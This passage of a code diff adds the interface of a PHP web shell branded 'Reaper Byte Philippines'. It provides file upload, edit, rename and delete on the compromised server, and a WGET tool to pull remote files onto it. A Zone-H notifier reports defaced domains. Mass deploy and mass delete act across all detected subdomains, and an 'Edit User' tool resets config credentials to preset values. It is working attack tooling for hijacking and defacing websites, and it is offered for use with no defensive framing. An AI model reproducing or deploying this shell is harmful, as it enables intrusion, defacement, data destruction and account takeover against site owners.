+            input2.name = "mass_delete";
+            input2.value = "1";
+            
+            var input3 = document.createElement("input");
+            input3.name = "d";
+            input3.value = "<?php echo base64_encode($currentDir); ?>";
+            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        function RBPdownloadDomains() {
+            window.open('?download=1', '_blank');
+        }
+        
+        function RBPsubmitEditUser() {
+            var form = document.createElement("form");
+            form.method = "post";
+            
+            var input1 = document.createElement("input");
+            input1.name = "config_dir";
+            input1.value = document.getElementById('config_dir').value;
+            
+            var input2 = document.createElement("input");
+            input2.name = "user_baru";
+            input2.value = document.getElementById('user_baru').value;
+            
+            var input3 = document.createElement("input");
+            input3.name = "pass_baru";
+            input3.value = document.getElementById('pass_baru').value;
+            
+            var input4 = document.createElement("input");
+            input4.name = "edit_user_submit";
+            input4.value = "1";
+            
+            var input5 = document.createElement("input");
+            input5.name = "d";
+            input5.value = "<?php echo base64_encode($currentDir); ?>";
+            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
+            form.appendChild(input4);
+            form.appendChild(input5);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        // Auto-show results popup if there are results
+        window.onload = function() {
+            <?php if (isset($_SESSION['mass_deploy_results'])): ?>
+            document.getElementById('resultsPopup').style.display = 'block';
+            <?php elseif (isset($_SESSION['mass_delete_results'])): ?>
+            document.getElementById('resultsPopup').style.display = 'block';
+            <?php endif; ?>
+        };
+    </script>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-container">
+            <img src="https://i.ibb.co/0jsfxQpc/unnamed-11-removebg-preview-1.png" class="logo" alt="RBP Logo">
+            <div class="logo-text">Reaper Byte Philippines</div>
+        </div>
+        
+        <div class="toolbar">
+            <button onclick="RBPshowAdminerPopup()" class="tool-button">Adminer</button>
+            <button onclick="RBPshowZoneHPopup()" class="tool-button">Zone-H</button>
+            <button onclick="RBPshowEditUserPopup()" class="tool-button">Edit User</button>
+            <button onclick="RBPshowWgetPopup()" class="tool-button">WGET Download</button>
+            <button onclick="RBPshowMassDeployPopup()" class="tool-button">Auto Mass Deploy</button>
+        </div>
+        
+        <div class="upload-section">
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="u" style="color:#fff;background:#333;padding:5px;border-radius:3px;border:1px solid #555;">
+                <input type="submit" name="s" value="Upload" class="tool-button">
+                <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
+            </form>
+        </div>
+    </div>
+
+    <!-- Results Popup -->
+    <div id="resultsPopup" class="results-popup">
+        <div class="results-content">
+            <?php
+            if (isset($_SESSION['mass_deploy_results'])) {
+                $results = $_SESSION['mass_deploy_results'];
+                $sourceFile = $_SESSION['mass_deploy_source'];
+                $baseDir = $_SESSION['mass_deploy_base'];
+                
+                echo '<h3>Mass Deploy Results</h3>';
+                echo '<p><strong>Source File:</strong> ' . htmlspecialchars($sourceFile) . '</p>';
+                echo '<p><strong>Base Directory:</strong> ' . htmlspecialchars($baseDir) . '</p>';
+                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+                
+                foreach ($results as $result) {
+                    $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
+                    echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
+                }
+                
+                echo '</div>';
+                
+                // Clear session
+                unset($_SESSION['mass_deploy_results']);
+                unset($_SESSION['mass_deploy_source']);
+                unset($_SESSION['mass_deploy_base']);
+            } elseif (isset($_SESSION['mass_delete_results'])) {
+                $results = $_SESSION['mass_delete_results'];
+                $filename = $_SESSION['mass_delete_filename'];
+                $baseDir = $_SESSION['mass_delete_base'];
+                
+                echo '<h3>Mass Delete Results</h3>';
+                echo '<p><strong>Target Filename:</strong> ' . htmlspecialchars($filename) . '</p>';
+                echo '<p><strong>Base Directory:</strong> ' . htmlspecialchars($baseDir) . '</p>';
+                echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+                
+                foreach ($results as $result) {
+                    $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
+                    echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
+                }
+                
+                echo '</div>';
+                
+                // Clear session
+                unset($_SESSION['mass_delete_results']);
+                unset($_SESSION['mass_delete_filename']);
+                unset($_SESSION['mass_delete_base']);
+            }
+            ?>
+            <div style="text-align: center; margin-top: 15px;">
+                <button onclick="RBPcloseResultsPopup()" class="tool-button">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WGET Popup -->
+    <div id="wgetPopup" class="popup-overlay">
+        <div class="popup-content">
+            <h3>WGET Download</h3>
+            <p>Enter URL to download file:</p>
+            <input type="text" id="wgetUrl" placeholder="https://example.com/file.txt" value="https://">
+            <div style="text-align: center; margin-top: 15px;">
+                <button onclick="RBPsubmitWget()" class="tool-button">Download</button>
+                <button onclick="RBPclosePopup('wgetPopup')" class="tool-button">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Adminer Popup -->
+    <div id="adminerPopup" class="popup-overlay">
+        <div class="popup-content">
+            <div id="adminerContent">
+                <h3>Adminer Downloader</h3>
+                <p>Download and install Adminer database management tool.</p>
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="RBPsubmitAdminer()" class="tool-button">Download Adminer</button>
+                    <button onclick="RBPclosePopup('adminerPopup')" class="tool-button">Cancel</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Zone-H Popup -->
+    <div id="zonehPopup" class="popup-overlay">
+        <div class="popup-content">
+            <div id="zonehContent">
+                <h3>Zone-H Notifier</h3>
+                <p>Defacer Name:</p>
+                <input type="text" id="zoneh_nick" value="RBP">
+                <p>Domains (one per line):</p>
+                <textarea id="zoneh_url" rows="10" placeholder="example.com&#10;example.net&#10;example.org"></textarea>
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="RBPsubmitZoneH()" class="tool-button">Submit to Zone-H</button>
+                    <button onclick="RBPclosePopup('zonehPopup')" class="tool-button">Cancel</button>
+                </div>
+                <p><small>Note: Each domain will automatically have /rbp.html added</small></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mass Deploy Popup -->
+    <div id="massDeployPopup" class="popup-overlay">
+        <div class="popup-content">
+            <div id="massDeployContent">
+                <h3>Auto Mass Deploy</h3>
+                
+                <div class="domain-info" id="domainInfo">
+                    <!-- Domain info will be populated by JavaScript -->
+                </div>
+                
+                <p><strong>Select File to Deploy:</strong></p>
+                <div id="fileList" class="file-selector">
+                    <!-- Files will be populated by JavaScript -->
+                </div>
+                
+                <p><strong>Selected File Path:</strong></p>
+                <input type="text" id="deploy_file_path" placeholder="/path/to/your/file.html" readonly>
+                
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="RBPsubmitMassDeploy()" class="tool-button">Deploy to All Domains</button>
+                    <button onclick="RBPsubmitMassDelete()" class="tool-button">Delete from All Domains</button>
+                    <button onclick="RBPdownloadDomains()" class="tool-button">Download Domains List</button>
+                    <button onclick="RBPclosePopup('massDeployPopup')" class="tool-button">Cancel</button>
+                </div>
+                
+                <p><small>This will automatically deploy the selected file to ALL detected subdomains in: <?php echo htmlspecialchars($baseDir); ?></small></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Edit User Popup -->
+    <div id="edituserPopup" class="popup-overlay">
+        <div class="popup-content">
+            <div id="edituserContent">
+                <h3>Auto Edit User Config</h3>
+                <p>Config Directory:</p>
+                <input type="text" id="config_dir" value="<?php echo $currentDir; ?>">
+                <p>New Username:</p>
+                <input type="text" id="user_baru" value="RBP" placeholder="New Username">
+                <p>New Password:</p>
+                <input type="text" id="pass_baru" value="RBP690" placeholder="New Password">
+                <div style="text-align: center; margin-top: 15px;">
+                    <button onclick="RBPsubmitEditUser()" class="tool-button">Edit User</button>
+                    <button onclick="RBPclosePopup('edituserPopup')" class="tool-button">Cancel</button>
+                </div>
+                <p><small>Note: This tool works when run inside a config folder</small></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="status-bar" id="statusBar">
+        Ready - Reaper Byte PH Activated
+    </div>
+
+<?php
+// Only show file listing if not in edit/rename mode
+if (!isset($_POST['edit']) && !isset($_POST['ren'])) {
+    // Directory Navigation
+    $pathParts = explode("/", $currentDir);
+    echo "<div class=\"dir-path\">";
+    foreach ($pathParts as $k => $v) {
+        if ($v == "" && $k == 0) {
+            echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('/')\">/</a>";
+            continue;
+        }
+        $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
+        echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($dirPath) . "')\">$v</a>/";
+    }
+    echo "</div>";
+
+    // File/Folder Listing
+    $items = @scandir($currentDir);
+    if ($items !== false) {
+        echo "<div class='file-list'>";
+        foreach ($items as $item) {
+            $fullPath = $currentDir . '/' . $item;
+            if ($item == '.' || $item == '..') continue;
+
+            if (is_dir($fullPath)) {
+                echo "<div class='file-item folder' onclick=\"RBPpostDir('" . addslashes($fullPath) . "')\">
+                        <div class='file-icon'>📁</div>
+                        <div class='file-name'>$item</div>
+                        <div class='file-size'>--</div>
+                      </div>";
+            } else {
+                $size = filesize($fullPath);
+                $sizeFormatted = $size >= 1048576 ? round($size / 1048576, 2) . ' MB' : ($size >= 1024 ? round($size / 1024, 2) . ' KB' : $size . ' B');
+                echo "<div class='file-item file'>
+                        <div class='file-icon'>📄</div>
+                        <div class='file-name' onclick=\"RBPpostOpen('" . addslashes($fullPath) . "')\">$item</div>
+                        <div class='file-size'>$sizeFormatted</div>
+                        <div class='file-actions'>
+                            <button onclick=\"RBPpostDel('" . addslashes($fullPath) . "')\">Delete</button>
+                            <button onclick=\"RBPpostEdit('" . addslashes($fullPath) . "')\">Edit</button>
+                            <button onclick=\"RBPpostRen('" . addslashes($fullPath) . "', '$item')\">Rename</button>
+                        </div>
+                      </div>";
+            }
+        }
+        echo "</div>";
+    } else {
+        echo "<p>Unable to read directory!</p>";
+    }
+}
+
+// Edit File (only shows when editing)
+if (isset($_POST['edit'])) {
+    $filePath = base64_decode($_POST['edit']);
+    $fileDir = dirname($filePath);
+    if (file_exists($filePath)) {
+        echo "<style>.file-list{display:none;}</style>";
+        echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($fileDir) . "')\">Back</a>";
+        echo "<form method=\"post\">
+            <input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">
+            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">
+            <textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
+            <center><button type=\"submit\" name=\"save\" class=\"tool-button\">Save</button></center>
+            </form>";
+    }
+}
+
+// Rename form (only shows when renaming without new name)
+if (isset($_POST['ren']) && !isset($_POST['new'])) {
+    $oldPath = base64_decode($_POST['ren']);
+    $oldDir = dirname($oldPath);
+    echo "<style>.file-list{display:none;}</style>";
+    echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($oldDir) . "')\">Back</a>";
+    echo "<form method=\"post\">
+        New Name: <input name=\"new\" type=\"text\">
+        <input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">
+        <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">
+        <input type=\"submit\" value=\"Submit\" class=\"tool-button\">
+        </form>";
+}
+?>
+</body>
+</html>
